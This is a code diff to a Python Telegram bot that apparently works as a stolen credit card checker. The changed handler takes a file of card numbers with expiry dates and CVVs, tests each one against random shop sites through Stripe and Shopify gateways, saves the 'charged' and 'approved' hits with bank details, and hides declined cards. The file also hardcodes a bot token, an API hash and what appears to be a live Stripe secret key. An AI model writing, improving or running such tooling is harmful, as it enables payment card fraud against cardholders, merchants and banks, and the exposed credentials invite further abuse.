@@ -1,7 +1,7 @@
 from telethon import TelegramClient, events, Button
-from telethon.tl.types import KeyboardButtonCallback, MessageEntityCustomEmoji
+from telethon.tl.types import MessageEntityCustomEmoji
 import requests, random, datetime, json, os, re, asyncio, time
-import string, hashlib, aiohttp, stripe, aiofiles
+import string, aiohttp, stripe, aiofiles
 from urllib.parse import urlparse
 import html
 
@@ -11,10 +11,9 @@ API_HASH = "7517ae9cd54e88cb63f39a061d8bb77f"
 BOT_TOKEN = "8644266957:AAEYmAA2uiR9732a_8xnyBJUEr_NXUyyCPs"
 
 OWNER_ID = 8353717748
-GROUP_ID = -1003578985585
 STRIPE_KEYS = ["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"]
 
-# PREMIUM CUSTOM EMOJI MAPPING
+# EMOJIS
 STATUS_EMOJIS = {
     "CHARGED": "5197434882321567830",
     "APPROVED": "6147565374289220368",
@@ -29,13 +28,10 @@ STATUS_EMOJIS = {
 SPECIAL_EMOJIS = {
     "PRICE": "5429518319243775957",
     "LOADING": "5927197323955278457",
-    "SUCCESS_SMALL": "5456441785595206330",
     "FIRE": "5798670723975221399",
-    "STOP": "5276448712766266718",
-    "STATS": "6289610422488139897",
 }
 
-# ==================== FILES & GLOBAL VARIABLES ====================
+# FILES
 ADMIN_FILE = "admins.json"
 PREMIUM_FILE = "premium.json"
 FREE_FILE = "free_users.json"
@@ -48,9 +44,8 @@ PROXY_FILE = "proxy.json"
 ACTIVE_MTXT_PROCESSES = {}
 TEMP_WORKING_SITES = {}
 
-# ─── CREATE CLIENT ONLY ONCE ─────────────────────────────────────
+# CLIENT - ONLY ONCE
 client = TelegramClient('cc_bot', API_ID, API_HASH)
-
 stripe.api_key = STRIPE_KEYS[0]
 
 ACTIVE_MTXT_PROCESSES = {}
@@ -2597,6 +2592,7 @@ async def ranfor(event):
     except:
         return await event.reply("File read error.")
 
+    # Extract only valid cards
     cards = [line.strip() for line in lines if re.match(r'^\d{16}\|\d{2}\|\d{2}\|\d{3,4}$', line.strip())]
     if not cards:
         return await event.reply("No valid cards found in file.")
@@ -2614,8 +2610,78 @@ async def ranfor(event):
     if not sites:
         return await event.reply("No sites in sites.txt! Contact admin.")
 
+    # Start processing with only hits
     asyncio.create_task(process_ranfor_cards(event, cards, sites))
 
+
+async def process_ranfor_cards(event, cards, sites):
+    status_msg = await event.reply(f"🔥 Cooking {len(cards)} cards... (Only Hits will be shown)")
+
+    charged = 0
+    approved = 0
+    total_checked = 0
+
+    for i, card in enumerate(cards, 1):
+        if event.sender_id not in ACTIVE_MTXT_PROCESSES:  # allow stop if needed
+            break
+
+        site = random.choice(sites)
+        try:
+            result = await check_card_specific_site(card, site, event.sender_id)
+            response_text = str(result.get("Response", "")).lower()
+
+            is_hit = False
+
+            if "charged" in response_text or "order completed" in response_text or "💎" in response_text:
+                charged += 1
+                status = "CHARGED 💎"
+                is_hit = True
+                await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
+
+            elif "approved" in response_text or "success" in response_text or "thank you" in response_text:
+                approved += 1
+                status = "APPROVED ✅"
+                is_hit = True
+                await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
+
+            total_checked += 1
+
+            # ONLY SEND MESSAGE IF IT'S A HIT (Approved or Charged)
+            if is_hit:
+                brand, btype, level, bank, country, flag = await get_bin_info(card.split("|")[0][:6])
+                msg = f"""
+{status}
+𝗖𝗖 ⇾ `{card}`
+𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {result.get('Gateway', 'Shopify')}
+𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {result.get('Response', 'No response')}
+𝗣𝗿𝗶𝗰𝗲 ⇾ {result.get('Price', '-')}
+𝗦𝗶𝘁𝗲 ⇾ {site}
+BIN: {brand} - {btype} - {level} | {bank} | {country} {flag}
+"""
+                await event.reply(msg)
+
+        except Exception as e:
+            pass  # silently ignore errors on declined cards
+
+        # Update progress (shows only hits)
+        await status_msg.edit(
+            f"🔥 Running /ran...\n"
+            f"Checked: {i}/{len(cards)}\n"
+            f"💎 Charged: {charged}\n"
+            f"✅ Approved: {approved}\n"
+            f"⏳ Only Hits are being sent"
+        )
+
+        await asyncio.sleep(1.5)  # anti-flood
+
+    # Final message
+    await status_msg.edit(
+        f"✅ /ran Finished!\n"
+        f"Total Cards: {len(cards)}\n"
+        f"💎 Charged: {charged}\n"
+        f"✅ Approved: {approved}\n"
+        f"Declined cards were hidden as requested."
+    )
 @client.on(events.CallbackQuery(pattern=rb"stop_ran:(\d+)"))
 async def stop_ran_callback(event):
     try:
@@ -2630,65 +2696,6 @@ async def stop_ran_callback(event):
             await event.answer("Already finished or not running.", alert=True)
     except:
         await event.answer("Error stopping process.", alert=True)
-
-async def process_ranfor_cards(event, cards, sites):
-    status_msg = await event.reply(f"🔥 Cooking {len(cards)} cards from file using random sites...")
-
-    charged = 0
-    approved = 0
-    declined = 0
-
-    for i, card in enumerate(cards, 1):
-        site = random.choice(sites)
-        try:
-            result = await check_card_specific_site(card, site, event.sender_id)
-            response_text = result.get("Response", "").lower()
-
-            if "charged" in response_text or "order completed" in response_text or "💎" in response_text:
-                charged += 1
-                status = "CHARGED 💎"
-                await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
-            elif "approved" in response_text or "success" in response_text or "thank you" in response_text:
-                approved += 1
-                status = "APPROVED ✅"
-                await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
-            else:
-                declined += 1
-                status = "DECLINED ❌"
-
-            brand, btype, level, bank, country, flag = await get_bin_info(card.split("|")[0][:6])
-
-            msg = f"""
-{status}
-𝗖𝗖 ⇾ `{card}`
-𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {result.get('Gateway', 'Shopify')}
-𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {result.get('Response', 'No response')}
-𝗣𝗿𝗶𝗰𝗲 ⇾ {result.get('Price', '-')}
-𝗦𝗶𝘁𝗲 ⇾ {site}
-BIN: {brand} - {btype} - {level} | {bank} | {country} {flag}
-"""
-            await event.reply(msg)
-
-        except Exception as e:
-            declined += 1
-            await event.reply(f"❌ Error on {card}: {str(e)[:100]}")
-
-        await asyncio.sleep(1.5)
-
-        await status_msg.edit(
-            f"Progress: {i}/{len(cards)}\n"
-            f"💎 Charged: {charged}\n"
-            f"✅ Approved: {approved}\n"
-            f"❌ Declined: {declined}"
-        )
-
-    await status_msg.edit(
-        f"✅ Finished!\n"
-        f"Total: {len(cards)}\n"
-        f"💎 Charged: {charged}\n"
-        f"✅ Approved: {approved}\n"
-        f"❌ Declined: {declined}"
-    )
 
 async def check_card_with_retries_ranfor(card, site, user_id, global_sites, max_retries=3):
     """Check a card with automatic retry up to max_retries times on site errors"""
